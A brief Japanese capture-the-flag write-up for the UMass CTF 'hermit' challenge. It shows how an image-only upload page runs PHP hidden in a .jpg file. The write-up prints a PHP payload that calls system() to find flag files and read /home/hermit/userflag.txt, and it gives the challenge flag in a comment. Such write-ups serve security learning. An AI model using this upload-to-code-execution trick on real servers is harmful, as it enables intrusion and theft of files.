# Writeup

ページにアクセスすると、ファイルアップロードの画面が表示される。

![](img/2021-03-27-16-38-37.png)

特定の画像ファイルしかアップロードできないが、`.jpg`という拡張子のファイルにPHPコードを書くと実行させることができる。

```php
<?php 
system("find / -name *flag*");
echo "<br>";
system("cat /home/hermit/userflag.txt");
?>
```

![](img/2021-03-27-16-39-00.png)

![](img/2021-03-27-16-40-11.png)

<!-- UMASS{a_picture_paints_a_thousand_shells} -->